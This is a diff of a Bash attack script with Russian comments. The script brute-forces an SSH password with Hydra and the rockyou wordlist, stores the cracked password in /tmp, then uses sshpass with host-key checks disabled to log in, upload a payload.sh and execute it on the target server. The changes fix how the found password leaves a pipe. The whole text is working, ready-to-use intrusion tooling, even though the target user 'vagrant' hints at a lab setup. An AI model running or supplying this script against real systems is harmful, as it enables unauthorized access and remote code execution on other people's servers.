@@ -7,7 +7,7 @@ TARGET_USER="vagrant"
 WORDLIST="rockyou.txt"
 PAYLOAD_FILE="payload.sh" 
 LOG_FILE="attack_log.txt"
-
+PASSWORD=""
 
 # Цвета
 GREEN='\033[0;32m'
@@ -22,47 +22,38 @@ echo "[*] $(date)" >> $LOG_FILE
 # Bruteforce SSH пароля с помощью Hydra
 echo -e "${BLUE}[+]${NC} 1. Bruteforce пароля с помощью Hydra..."
 
-# Переменная для отслеживания найденного пароля
 PASSWORD=""
-FOUND=0
 
-while IFS= read -r line; do
+# Запускаем hydra и обрабатываем вывод в фоне, сохраняя пароль
+hydra -l $TARGET_USER -P $WORDLIST -v -f \
+    ssh://$TARGET_IP:$TARGET_PORT 2>&1 | while IFS= read -r line; do
     echo "$line" | tee -a $LOG_FILE
     
     # Ищем строку с найденным паролем
-    # Hydra выводит что-то вроде: [22][ssh] host: 33.57.84.200   login: vagrant   password: my_password
     if echo "$line" | grep -qi "\[22\]\[ssh\].*password:"; then
-        # Пытаемся несколько вариантов парсинга
         PASSWORD=$(echo "$line" | grep -oP 'password:\s*\K\S+' | head -1)
-        
-        # Если первый вариант не сработал, пробуем второй
-        if [ -z "$PASSWORD" ]; then
-            PASSWORD=$(echo "$line" | sed -n 's/.*password:\s*\(\S*\).*/\1/p')
-        fi
         
         if [ ! -z "$PASSWORD" ]; then
             echo -e "${GREEN}[✓]${NC} Пароль найден: $PASSWORD" | tee -a $LOG_FILE
-            FOUND=1
-            break
+            # Сохраняем пароль в файл (важно!)
+            echo "$PASSWORD" > /tmp/ssh_password.txt
         fi
     fi
     
-    # Дополнительный признак успеха Hydra
     if echo "$line" | grep -qi "1 of 1 target successfully completed"; then
         echo -e "${YELLOW}[!]${NC} Hydra завершила работу" | tee -a $LOG_FILE
-        break
     fi
-    
-done < <(hydra -l $TARGET_USER -P $WORDLIST -v -f \
-    ssh://$TARGET_IP:$TARGET_PORT 2>&1)
+done
 
-# Проверяем, найден ли пароль
-if [ -z "$PASSWORD" ]; then
+# ВАЖНО: Читаем пароль из файла (переменная в pipe не сохраняется)
+if [ -f /tmp/ssh_password.txt ]; then
+    PASSWORD=$(cat /tmp/ssh_password.txt)
+    echo -e "${GREEN}[✓]${NC} Пароль загружен: $PASSWORD" | tee -a $LOG_FILE
+    rm -f /tmp/ssh_password.txt
+else
     echo -e "${RED}[-]${NC} Пароль не найден" | tee -a $LOG_FILE
     exit 1
 fi
-
-echo -e "${GREEN}[✓]${NC} Пароль для использования: $PASSWORD" | tee -a $LOG_FILE
 
 # Проверяем подключение
 echo -e "${BLUE}[+]${NC} 2. Проверка подключения SSH..." | tee -a $LOG_FILE
@@ -106,7 +97,7 @@ fi
 echo -e "${GREEN}[✓]${NC} Payload загружен" | tee -a $LOG_FILE
 
 # Выполняем payload
-echo -e "${BLUE}[+]${NC} 4. Выполнение полезной нагрузки на целевом сервере..."
+echo -e "${BLUE}[+]${NC} 4. Выполнение полезной нагрузки на целевом сервере..." | tee -a $LOG_FILE
 sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null \
     $TARGET_USER@$TARGET_IP "bash /tmp/payload.sh" 2>&1 | tee -a $LOG_FILE
@@ -114,7 +105,7 @@ sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
 echo -e "${GREEN}[✓]${NC} Payload выполнен" | tee -a $LOG_FILE
 
 # Проверяем результаты
-echo -e "${BLUE}[+]${NC} 5. Проверка результатов на целевом сервере..."
+echo -e "${BLUE}[+]${NC} 5. Проверка результатов на целевом сервере..." | tee -a $LOG_FILE
 echo "" | tee -a $LOG_FILE
 echo "=== РЕЗУЛЬТАТЫ ===" | tee -a $LOG_FILE
 sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no \
